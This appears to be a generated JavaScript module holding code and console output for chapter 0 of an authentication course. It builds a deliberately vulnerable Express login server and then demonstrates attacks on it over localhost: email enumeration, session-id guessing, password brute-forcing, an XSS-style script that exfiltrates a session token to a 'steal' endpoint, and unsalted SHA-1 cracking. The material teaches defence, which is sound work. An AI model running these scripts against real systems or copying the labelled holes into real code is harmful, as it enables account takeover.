/**
 * _ma.mjs (Chương 0) — SINH TỰ ĐỘNG bằng scripts/tst/sinh-ma.mjs từ dự án chạy thật. Đừng sửa tay.
 */
export const CODE = {
  server0: `// src/server.js — LabFlow ID v0 (lesson 0.3): a login that runs, and is wrong in six ways.
// Every "hole N" comment is fixed in a later chapter. Never deploy this file.
import express from 'express';
import { load, save } from './store.js';

const app = express();
app.use(express.json());

app.post('/sign-up', (req, res) => {
  const { email, password, name } = req.body;
  const db = load();
  const user = { id: 'usr_' + (db.users.length + 1), email, password, name }; // hole 1
  db.users.push(user);
  save(db);
  res.status(201).json({ id: user.id });
});

app.post('/sign-in', (req, res) => {
  const { email, password } = req.body;
  const db = load();
  const user = db.users.find((u) => u.email === email);
  if (!user) return res.status(401).json({ error: 'No account with that email' }); // hole 2
  if (user.password !== password) return res.status(401).json({ error: 'Wrong password' });
  const session = { id: String(Date.now()), userId: user.id }; // holes 3 and 4
  db.sessions.push(session);
  save(db);
  res.json({ session: session.id }); // hole 5
}); // hole 6: nothing counts the attempts

app.get('/me', (req, res) => {
  const db = load();
  const session = db.sessions.find((s) => s.id === req.get('x-session'));
  if (!session) return res.status(401).json({ error: 'Not signed in' });
  const user = db.users.find((u) => u.id === session.userId);
  res.json({ id: user.id, email: user.email, name: user.name });
});

const port = Number(process.env.PORT ?? 4800);
app.listen(port, () => console.log(\`LabFlow ID v0 on http://localhost:\${port}\`));`,
  store: `// src/store.js — the simplest possible "database": one JSON file, data/db.json.
// Good enough to see every problem of lesson 0.3 with your own eyes; Chapter 2 moves to PostgreSQL.
import fs from 'node:fs';
import path from 'node:path';

const FILE = process.env.DB_FILE ?? 'data/db.json';

export function load() {
  if (!fs.existsSync(FILE)) return { users: [], sessions: [] };
  return JSON.parse(fs.readFileSync(FILE, 'utf8'));
}

export function save(db) {
  fs.mkdirSync(path.dirname(FILE), { recursive: true });
  fs.writeFileSync(FILE, JSON.stringify(db, null, 2) + '\\n');
}`,
  seed: `// scripts/seed.mjs — create the three LabFlow users through the real sign-up endpoint (server must be running).
const BASE = process.env.BASE ?? 'http://localhost:4800';
const USERS = [
  { email: 'an@student.labflow.example', password: 'an-lab-2026', name: 'Nguyen Van An' },
  { email: 'binh@student.labflow.example', password: '123456', name: 'Tran Thi Binh' },
  { email: 'lan@labflow.example', password: 'lan-lab-2026', name: 'Co Lan' },
];
for (const u of USERS) {
  const res = await fetch(BASE + '/sign-up', {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(u),
  });
  console.log(res.status, u.email, JSON.stringify(await res.json()));
}`,
  forget: `// demo0/forget.js — lesson 0.1: three ways a server might try to "remember" who you are.
// Only the third one survives real networks — and it is the idea behind every login in this course.
import express from 'express';
import { randomBytes } from 'node:crypto';

const app = express();
app.use(express.json());

// What the server actually receives: a method, a path, some headers. No "who".
app.get('/raw', (req, res) => {
  const lines = [\`\${req.method} \${req.url} HTTP/\${req.httpVersion}\`];
  for (let i = 0; i < req.rawHeaders.length; i += 2) lines.push(\`\${req.rawHeaders[i]}: \${req.rawHeaders[i + 1]}\`);
  res.type('text').send(lines.join('\\n') + '\\n');
});

// Try 1 — remember by IP address
const byIp = new Map();
app.post('/ip/sign-in', (req, res) => {
  byIp.set(req.ip, req.body.name);
  res.json({ remembered: req.body.name, ip: req.ip });
});
app.get('/ip/me', (req, res) => res.json({ you: byIp.get(req.ip) ?? null, ip: req.ip }));

// Try 2 — remember by TCP connection
app.post('/conn/sign-in', (req, res) => {
  req.socket.who = req.body.name;
  res.json({ remembered: req.body.name, clientPort: req.socket.remotePort });
});
app.get('/conn/me', (req, res) => res.json({ you: req.socket.who ?? null, clientPort: req.socket.remotePort }));

// Try 3 — the client carries proof on every request
const cards = new Map();
app.post('/card/sign-in', (req, res) => {
  const card = randomBytes(16).toString('base64url');
  cards.set(card, req.body.name);
  res.json({ card });
});
app.get('/card/me', (req, res) => res.json({ you: cards.get(req.get('x-card')) ?? null }));

app.listen(4800, () => console.log('demo0/forget.js on http://localhost:4800'));`,
  gates: `// demo0/gates.js — lesson 0.2: identification, authentication and authorization are three separate gates.
import express from 'express';

const users = [
  { id: 'usr_1', name: 'Nguyen Van An', role: 'STUDENT', email: 'an@student.labflow.example', phone: '0901 000 001' },
  { id: 'usr_2', name: 'Tran Thi Binh', role: 'STUDENT', email: 'binh@student.labflow.example', phone: '0901 000 002' },
  { id: 'usr_3', name: 'Co Lan', role: 'LAB_MANAGER', email: 'lan@labflow.example', phone: '0901 000 003' },
];
// Demo credentials only (Chapter 3 replaces them with real sessions).
const TOKENS = new Map([['tok_an', 'usr_1'], ['tok_bin', 'usr_2'], ['tok_lan', 'usr_3']]);
const find = (id) => users.find((u) => u.id === id);

const app = express();
app.use(express.json());

// Gate 1 only — identification: the client SAYS who it is, nobody checks.
app.get('/v1/me', (req, res) => {
  const user = find(req.get('x-user-id'));
  if (!user) return res.status(400).json({ error: 'Send X-User-Id' });
  res.json(user);
});

// Gate 2 — authentication: prove it.
function authenticate(req, res, next) {
  const token = (req.get('authorization') ?? '').replace(/^Bearer /, '');
  const user = find(TOKENS.get(token));
  if (!user) {
    return res.status(401).set('WWW-Authenticate', 'Bearer realm="labflow-id"').json({ error: 'UNAUTHENTICATED' });
  }
  req.user = user;
  next();
}

// Gates 1 + 2, gate 3 forgotten: any signed-in user can read any profile (IDOR).
app.get('/v2/users/:id', authenticate, (req, res) => {
  const user = find(req.params.id);
  if (!user) return res.status(404).json({ error: 'NOT_FOUND' });
  res.json(user);
});

// All three gates. Gate 3 lives in the lookup itself: yourself, or a lab manager.
app.get('/v3/users/:id', authenticate, (req, res) => {
  const allowed = req.user.id === req.params.id || req.user.role === 'LAB_MANAGER';
  const user = allowed ? find(req.params.id) : undefined;
  if (!user) return res.status(404).json({ error: 'NOT_FOUND' });
  res.json(user);
});

// 403: we know exactly who you are, and the answer is still no.
app.patch('/v3/users/:id/role', authenticate, (req, res) => {
  if (req.user.role !== 'LAB_MANAGER') return res.status(403).json({ error: 'FORBIDDEN' });
  const user = find(req.params.id);
  if (!user) return res.status(404).json({ error: 'NOT_FOUND' });
  user.role = req.body.role;
  res.json(user);
});

app.listen(4800, () => console.log('demo0/gates.js on http://localhost:4800'));`,
  enumerate: `// demo0/enumerate.mjs — hole 2: the error message tells a stranger which emails have an account.
const BASE = process.env.BASE ?? 'http://localhost:4800';
const leaked = [ // e.g. from another site's breach
  'an@student.labflow.example', 'minh@student.labflow.example', 'binh@student.labflow.example',
  'hoa@student.labflow.example', 'lan@labflow.example', 'admin@labflow.example',
];
for (const email of leaked) {
  const res = await fetch(BASE + '/sign-in', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password: 'not-the-password' }),
  });
  const { error } = await res.json();
  console.log(error === 'Wrong password' ? 'HAS AN ACCOUNT ' : 'no account     ', email, '←', JSON.stringify(error));
}`,
  guessSession: `// demo0/guess-session.mjs — hole 3: the session id is Date.now(), so knowing the MINUTE of a sign-in is enough.
// Usage: node demo0/guess-session.mjs HH:MM   (the minute of the sign-in, today, local time)
const BASE = process.env.BASE ?? 'http://localhost:4800';
const [hh, mm] = process.argv[2].split(':').map(Number);
const from = new Date().setHours(hh, mm, 0, 0); // first millisecond of that minute
const CONCURRENCY = 32;
const t0 = performance.now();
let next = from;
let tries = 0;
let found = null;
async function worker() {
  while (!found && next < from + 60_000) {
    const guess = String(next++);
    tries++;
    const res = await fetch(BASE + '/me', { headers: { 'x-session': guess } });
    if (res.status === 200) found = { guess, me: await res.json() };
    else await res.arrayBuffer();
  }
}
await Promise.all(Array.from({ length: CONCURRENCY }, worker));
const s = (performance.now() - t0) / 1000;
console.log(\`window: 60,000 possible ids (one minute of Date.now())\`);
console.log(\`tried \${tries} ids in \${s.toFixed(2)} s (\${Math.round(tries / s)} requests/s)\`);
console.log(found ? \`FOUND session \${found.guess} → \${JSON.stringify(found.me)}\` : 'not found');`,
  brute: `// demo0/brute.mjs — hole 6: nothing counts failed attempts, so a script can try a whole password list.
// Usage: node demo0/brute.mjs <email> <password-list.txt>
import fs from 'node:fs';
const BASE = process.env.BASE ?? 'http://localhost:4800';
const [email, file] = process.argv.slice(2);
const list = fs.readFileSync(file, 'utf8').split('\\n').filter(Boolean);
const statuses = {};
const t0 = performance.now();
let found = null;
let i = 0;
for (; i < list.length && !found; i++) {
  const res = await fetch(BASE + '/sign-in', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password: list[i] }),
  });
  statuses[res.status] = (statuses[res.status] ?? 0) + 1;
  if (res.status === 200) found = list[i];
  await res.arrayBuffer();
}
const s = (performance.now() - t0) / 1000;
console.log(\`\${email}: \${i} attempts in \${s.toFixed(2)} s (\${Math.round(i / s)} attempts/s), statuses \${JSON.stringify(statuses)}\`);
console.log(found ? \`PASSWORD FOUND at attempt \${i}: \${JSON.stringify(found)}\` : 'not in the list');`,
  evil: `// demo0/evil.js — an attacker's server on another origin: it only logs what it receives.
import http from 'node:http';
http.createServer((req, res) => {
  console.log(\`[evil] \${req.method} \${req.url}\`);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.end('ok');
}).listen(4801, () => console.log('demo0/evil.js on http://127.0.0.1:4801'));`,
  storageXss: `// demo0/storage-xss.mjs — hole 5: a session kept in localStorage is readable by ANY script on the page.
// Usage: node demo0/storage-xss.mjs <session-id>    (needs src/server.js on :4800 and demo0/evil.js on :4801)
import { chromium } from 'playwright';
const sid = process.argv[2];
const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto('http://localhost:4800/me'); // any page of LabFlow ID's origin
// What a front end must do with hole 5: the browser will not send x-session by itself, so the app keeps it in JS.
await page.evaluate((s) => localStorage.setItem('labflow.session', s), sid);
// One injected script (an XSS, a compromised npm package, a bad browser extension) is enough:
const sent = await page.evaluate(async () => {
  const s = localStorage.getItem('labflow.session');
  await fetch('http://127.0.0.1:4801/steal?s=' + s);
  return s;
});
console.log('injected script read and sent:', sent);
await browser.close();`,
  firstProof: `// demo0/first-proof.mjs — Start here: your first "proof" in a dozen lines.
// The server stamps a value with a key only it knows. Change one character and the stamp no longer fits.
import { createHmac, timingSafeEqual } from 'node:crypto';

const KEY = 'demo-key-only-the-server-knows'; // a real server keeps this out of the code (lesson 1.5)
const stamp = (value) => createHmac('sha256', KEY).update(value).digest('base64url');
const issue = (value) => \`\${value}.\${stamp(value)}\`;

function check(card) {
  const i = card.lastIndexOf('.');
  const value = card.slice(0, i);
  const expected = Buffer.from(stamp(value));
  const got = Buffer.from(card.slice(i + 1));
  return expected.length === got.length && timingSafeEqual(expected, got) ? value : null;
}

const card = issue('user=An;role=STUDENT');
console.log('card issued to An  :', card);
console.log('An shows it back   :', check(card));
console.log('An edits the role  :', check(card.replace('STUDENT', 'MANAGER')));
console.log('Binh invents a card:', check('user=Binh;role=MANAGER.' + 'x'.repeat(43)));`,
  linkedin: `// demo0/linkedin-replay.mjs — Start here (2/2): why "we hashed the passwords" was not enough in 2012.
// Unsalted SHA-1 (what the 2012 LinkedIn dump contained): hash every common password ONCE, then look leaked hashes up.
import fs from 'node:fs';
import { createHash } from 'node:crypto';
const sha1 = (s) => createHash('sha1').update(s).digest('hex');

// A "leaked table": three LabFlow users, passwords stored as unsalted SHA-1.
const leaked = { an: sha1('an-lab-2026'), binh: sha1('123456'), lan: sha1('lan-lab-2026') };

const t0 = performance.now();
const list = fs.readFileSync('wordlists/10k-most-common.txt', 'utf8').split('\\n').filter(Boolean);
const table = new Map(list.map((p) => [sha1(p), p])); // computed ONCE, reused for every victim, forever
const ms = performance.now() - t0;
console.log(\`lookup table: \${table.size} common passwords hashed in \${ms.toFixed(1)} ms\`);
for (const [user, h] of Object.entries(leaked)) {
  console.log(\`\${user.padEnd(5)} \${h.slice(0, 16)}… → \${table.has(h) ? 'CRACKED: ' + JSON.stringify(table.get(h)) : 'not in the table (this time)'}\`);
}`,
  th08: `// demo0/th08.mjs — practice (Start here 1/2): a card for Binh, and what happens when the server's key changes.
import { createHmac, timingSafeEqual } from 'node:crypto';

const maker = (key) => {
  const stamp = (value) => createHmac('sha256', key).update(value).digest('base64url');
  return {
    issue: (value) => \`\${value}.\${stamp(value)}\`,
    check(card) {
      const i = card.lastIndexOf('.');
      const value = card.slice(0, i);
      const a = Buffer.from(stamp(value)); const b = Buffer.from(card.slice(i + 1));
      return a.length === b.length && timingSafeEqual(a, b) ? value : null;
    },
  };
};
const monday = maker('demo-key-monday');
const card = monday.issue('user=Binh;role=STUDENT');
console.log('Binh, same key       :', monday.check(card));
console.log('Binh renamed to An   :', monday.check(card.replace('user=Binh', 'user=An')));
const tuesday = maker('demo-key-tuesday'); // the server was restarted with a NEW key
console.log('old card, new key    :', tuesday.check(card));`,
  th09: `// demo0/th09.mjs — practice (Start here 2/2): add a per-user salt. The shared table dies; guessing ONE user does not.
import fs from 'node:fs';
import { createHash, randomBytes } from 'node:crypto';
const sha1 = (s) => createHash('sha1').update(s).digest('hex');
const list = fs.readFileSync('wordlists/10k-most-common.txt', 'utf8').split('\\n').filter(Boolean);
const table = new Map(list.map((p) => [sha1(p), p]));

const salt = randomBytes(16).toString('hex'); // stored next to the hash, different for every user
const binh = { salt, hash: sha1(salt + '123456') };
console.log('salted hash in the precomputed table?', table.has(binh.hash));
const t0 = performance.now();
const found = list.findIndex((p) => sha1(binh.salt + p) === binh.hash);
console.log(\`guessing Binh alone with her salt: found \${JSON.stringify(list[found])} at guess \${found + 1} in \${(performance.now() - t0).toFixed(2)} ms\`);`,
  th03Server: `// demo0/th03-server.js — practice 0.3: v0 with ONE message for both failures (hole 2, first half of the fix).
// Every "hole N" comment is fixed in a later chapter. Never deploy this file.
import express from 'express';
import { load, save } from '../src/store.js';

const app = express();
app.use(express.json());

app.post('/sign-up', (req, res) => {
  const { email, password, name } = req.body;
  const db = load();
  const user = { id: 'usr_' + (db.users.length + 1), email, password, name }; // hole 1
  db.users.push(user);
  save(db);
  res.status(201).json({ id: user.id });
});

app.post('/sign-in', (req, res) => {
  const { email, password } = req.body;
  const db = load();
  const user = db.users.find((u) => u.email === email);
  const ok = user && user.password === password;
  if (!ok) return res.status(401).json({ error: 'Email or password is incorrect' }); // same answer either way
  const session = { id: String(Date.now()), userId: user.id }; // holes 3 and 4
  db.sessions.push(session);
  save(db);
  res.json({ session: session.id }); // hole 5
}); // hole 6: nothing counts the attempts

app.get('/me', (req, res) => {
  const db = load();
  const session = db.sessions.find((s) => s.id === req.get('x-session'));
  if (!session) return res.status(401).json({ error: 'Not signed in' });
  const user = db.users.find((u) => u.id === session.userId);
  res.json({ id: user.id, email: user.email, name: user.name });
});

const port = Number(process.env.PORT ?? 4800);
app.listen(port, () => console.log(\`LabFlow ID v0 on http://localhost:\${port}\`));`,
};
export const OUT = {
  '01-card': `$ CARD=$(curl -s localhost:4800/card/sign-in --json '{"name":"An"}' | node -p 'JSON.parse(require("fs").readFileSync(0)).card'); echo "card: $CARD"; curl -s -w '\\n' localhost:4800/card/me -H "x-card: $CARD"; curl -s -w '\\n' 'http://[::1]:4800/card/me' -H "x-card: $CARD"; curl -s -w '\\n' localhost:4800/card/me
card: Cf7da2ve7zrHXFbAipcMlg
{"you":"An"}
{"you":"An"}
{"you":null}`,
  '01-conn-cung': `$ curl -s -w '\\n' localhost:4800/conn/sign-in --json '{"name":"An"}' --next -s -w '\\n' localhost:4800/conn/me
{"remembered":"An","clientPort":60295}
{"you":"An","clientPort":60295}`,
  '01-conn-moi': `$ curl -s -w '\\n' localhost:4800/conn/me
{"you":null,"clientPort":60296}`,
  '01-ip-4g': `$ curl -s -w '\\n' http://127.0.0.1:4800/ip/me
{"you":null,"ip":"::ffff:127.0.0.1"}`,
  '01-ip-an': `$ curl -s -w '\\n' localhost:4800/ip/sign-in --json '{"name":"An"}'
{"remembered":"An","ip":"::1"}`,
  '01-ip-binh': `$ curl -s -w '\\n' localhost:4800/ip/me
{"you":"An","ip":"::1"}`,
  '01-raw-trinh-duyet': `$ curl -s localhost:4800/raw -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0)' -H 'Accept-Language: vi'
GET /raw HTTP/1.1
Host: localhost:4800
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0)
Accept-Language: vi`,
  '01-raw': `$ curl -s localhost:4800/raw
GET /raw HTTP/1.1
Host: localhost:4800
User-Agent: curl/8.7.1
Accept: */*`,
  '01-thuc-hanh': `$ A=$(curl -s localhost:4800/card/sign-in --json '{"name":"An"}' | node -p 'JSON.parse(require("fs").readFileSync(0)).card'); B=$(curl -s http://127.0.0.1:4800/card/sign-in --json '{"name":"Binh"}' | node -p 'JSON.parse(require("fs").readFileSync(0)).card'); curl -s -w '\\n' localhost:4800/card/me -H "x-card: $A"; curl -s -w '\\n' http://127.0.0.1:4800/card/me -H "x-card: $B"; echo '--- Binh sends An'"'"'s card:'; curl -s -w '\\n' http://127.0.0.1:4800/card/me -H "x-card: $A"
{"you":"An"}
{"you":"Binh"}
--- Binh sends An's card:
{"you":"An"}`,
  '02-ma-tran': `$ for who in none tok_an tok_bin tok_lan; do printf '%-8s' $who; for id in usr_1 usr_2 usr_3; do printf ' %s=%s' $id $(curl -s -o /dev/null -w '%{http_code}' localhost:4800/v3/users/$id -H "Authorization: Bearer $who"); done; echo; done
none     usr_1=401 usr_2=401 usr_3=401
tok_an   usr_1=200 usr_2=404 usr_3=404
tok_bin  usr_1=404 usr_2=200 usr_3=404
tok_lan  usr_1=200 usr_2=200 usr_3=200`,
  '02-thuc-hanh-403': `$ curl -s -o /dev/null -w '%{http_code}\\n' -X PATCH localhost:4800/v3/users/usr_2/role -H 'Authorization: Bearer tok_bin' --json '{"role":"LAB_MANAGER"}'
403`,
  '02-v1-an': `$ curl -s -w '\\n' localhost:4800/v1/me -H 'X-User-Id: usr_1'
{"id":"usr_1","name":"Nguyen Van An","role":"STUDENT","email":"an@student.labflow.example","phone":"0901 000 001"}`,
  '02-v1-mao': `$ curl -s -w '\\n' localhost:4800/v1/me -H 'X-User-Id: usr_3'
{"id":"usr_3","name":"Co Lan","role":"LAB_MANAGER","email":"lan@labflow.example","phone":"0901 000 003"}`,
  '02-v2-401': `$ curl -si localhost:4800/v2/users/usr_1
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
WWW-Authenticate: Bearer realm="labflow-id"
Content-Type: application/json; charset=utf-8
Content-Length: 27
ETag: W/"1b-uEWe3cMh/qbfFZZPcZ02zN1OOzs"
Date: Sun, 01 Nov 2026 05:58:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"UNAUTHENTICATED"}`,
  '02-v2-an': `$ curl -s -w '\\n' localhost:4800/v2/users/usr_1 -H 'Authorization: Bearer tok_an'
{"id":"usr_1","name":"Nguyen Van An","role":"STUDENT","email":"an@student.labflow.example","phone":"0901 000 001"}`,
  '02-v2-idor': `$ curl -s -w '\\n' localhost:4800/v2/users/usr_2 -H 'Authorization: Bearer tok_an'
{"id":"usr_2","name":"Tran Thi Binh","role":"STUDENT","email":"binh@student.labflow.example","phone":"0901 000 002"}`,
  '02-v2-quet': `$ for id in usr_1 usr_2 usr_3 usr_4; do curl -s -o /dev/null -w "$id %{http_code}\\n" localhost:4800/v2/users/$id -H 'Authorization: Bearer tok_an'; done
usr_1 200
usr_2 200
usr_3 200
usr_4 404`,
  '02-v3-403': `$ curl -si -X PATCH localhost:4800/v3/users/usr_1/role -H 'Authorization: Bearer tok_an' --json '{"role":"LAB_MANAGER"}'
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 21
ETag: W/"15-nxF4bdlBQdfuxIUwK7UqJf9l44s"
Date: Sun, 01 Nov 2026 05:58:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"FORBIDDEN"}`,
  '02-v3-an': `$ for id in usr_1 usr_2 usr_3 usr_4; do curl -s -o /dev/null -w "$id %{http_code}\\n" localhost:4800/v3/users/$id -H 'Authorization: Bearer tok_an'; done
usr_1 200
usr_2 404
usr_3 404
usr_4 404`,
  '02-v3-lan-doi': `$ curl -s -w '\\n' -X PATCH localhost:4800/v3/users/usr_2/role -H 'Authorization: Bearer tok_lan' --json '{"role":"LAB_MANAGER"}'
{"id":"usr_2","name":"Tran Thi Binh","role":"LAB_MANAGER","email":"binh@student.labflow.example","phone":"0901 000 002"}`,
  '02-v3-lan': `$ for id in usr_1 usr_2 usr_3 usr_4; do curl -s -o /dev/null -w "$id %{http_code}\\n" localhost:4800/v3/users/$id -H 'Authorization: Bearer tok_lan'; done
usr_1 200
usr_2 200
usr_3 200
usr_4 404`,
  '03-an-dang-nhap': `$ curl -s -w '\\n' localhost:4800/sign-in --json '{"email":"an@student.labflow.example","password":"an-lab-2026"}'; date +%H:%M
{"session":"1793512776821"}
12:59`,
  '03-cai-dat': `$ node -v && npm -v && mkdir labflow-id && cd labflow-id && npm init -y >/dev/null && npm pkg set type=module && npm install --save-exact --no-audit --no-fund express@5.3.0 && npm ls && node -p 'require("./package.json").dependencies'
v22.23.3
10.9.9

added 65 packages in 399ms
labflow-id@1.0.0 …/setup/labflow-id
└── express@5.3.0

{ express: '5.3.0' }`,
  '03-db-mat-khau': `$ cat data/db.json
{
  "users": [
    {
      "id": "usr_1",
      "email": "an@student.labflow.example",
      "password": "an-lab-2026",
      "name": "Nguyen Van An"
    },
    {
      "id": "usr_2",
      "email": "binh@student.labflow.example",
      "password": "123456",
      "name": "Tran Thi Binh"
    },
    {
      "id": "usr_3",
      "email": "lan@labflow.example",
      "password": "lan-lab-2026",
      "name": "Co Lan"
    }
  ],
  "sessions": [
    {
      "id": "1793512776821",
      "userId": "usr_1"
    },
    {
      "id": "1793512781550",
      "userId": "usr_2"
    }
  ]
}`,
  '03-do-email': `$ node demo0/enumerate.mjs
HAS AN ACCOUNT  an@student.labflow.example ← "Wrong password"
no account      minh@student.labflow.example ← "No account with that email"
HAS AN ACCOUNT  binh@student.labflow.example ← "Wrong password"
no account      hoa@student.labflow.example ← "No account with that email"
HAS AN ACCOUNT  lan@labflow.example ← "Wrong password"
no account      admin@labflow.example ← "No account with that email"`,
  '03-do-mk-an': `$ node demo0/brute.mjs an@student.labflow.example wordlists/10k-most-common.txt
an@student.labflow.example: 10001 attempts in 3.48 s (2877 attempts/s), statuses {"401":10001}
not in the list`,
  '03-do-mk-binh': `$ node demo0/brute.mjs binh@student.labflow.example wordlists/10k-most-common.txt
binh@student.labflow.example: 2 attempts in 0.03 s (59 attempts/s), statuses {"200":1,"401":1}
PASSWORD FOUND at attempt 2: "123456"`,
  '03-doan-phien': `$ node demo0/guess-session.mjs 12:59
window: 60,000 possible ids (one minute of Date.now())
tried 36839 ids in 4.37 s (8424 requests/s)
FOUND session 1793512776821 → {"id":"usr_1","email":"an@student.labflow.example","name":"Nguyen Van An"}`,
  '03-khong-dang-xuat': `$ curl -s -o /dev/null -w '%{http_code}\\n' -X POST localhost:4800/sign-out -H 'x-session: 1793512776821'; curl -s -w '\\n' localhost:4800/me -H 'x-session: 1793512776821'
404
{"id":"usr_1","email":"an@student.labflow.example","name":"Nguyen Van An"}`,
  '03-me': `$ curl -s -w '\\n' localhost:4800/me -H 'x-session: 1793512776821'
{"id":"usr_1","email":"an@student.labflow.example","name":"Nguyen Van An"}`,
  '03-seed': `$ npm run seed

> labflow-id@0.1.0 seed
> node scripts/seed.mjs

201 an@student.labflow.example {"id":"usr_1"}
201 binh@student.labflow.example {"id":"usr_2"}
201 lan@labflow.example {"id":"usr_3"}`,
  '03-thuc-hanh': `$ npm run seed --silent >/dev/null; node demo0/enumerate.mjs
no account      an@student.labflow.example ← "Email or password is incorrect"
no account      minh@student.labflow.example ← "Email or password is incorrect"
no account      binh@student.labflow.example ← "Email or password is incorrect"
no account      hoa@student.labflow.example ← "Email or password is incorrect"
no account      lan@labflow.example ← "Email or password is incorrect"
no account      admin@labflow.example ← "Email or password is incorrect"`,
  '03-xss-dung': `$ curl -s -w '\\n' localhost:4800/me -H 'x-session: 1793512776821'
{"id":"usr_1","email":"an@student.labflow.example","name":"Nguyen Van An"}`,
  '03-xss-evil-log': `$ node demo0/evil.js
demo0/evil.js on http://127.0.0.1:4801
[evil] GET /steal?s=1793512776821`,
  '03-xss': `$ node demo0/storage-xss.mjs 1793512776821
injected script read and sent: 1793512776821`,
  '08-chung-minh-dau-tien': `$ node demo0/first-proof.mjs
card issued to An  : user=An;role=STUDENT.Yn7qc3nYvQSstjZdGMBQp8iEXfTmyQvyjBaWNAHlECs
An shows it back   : user=An;role=STUDENT
An edits the role  : null
Binh invents a card: null`,
  '08-thuc-hanh': `$ node demo0/th08.mjs
Binh, same key       : user=Binh;role=STUDENT
Binh renamed to An   : null
old card, new key    : null`,
  '09-linkedin': `$ node demo0/linkedin-replay.mjs
lookup table: 10001 common passwords hashed in 11.8 ms
an    2677ae8a88965e7c… → not in the table (this time)
binh  7c4a8d09ca3762af… → CRACKED: "123456"
lan   39289cdf947655dc… → not in the table (this time)`,
  '09-thuc-hanh': `$ node demo0/th09.mjs
salted hash in the precomputed table? false
guessing Binh alone with her salt: found "123456" at guess 2 in 0.26 ms`,
};
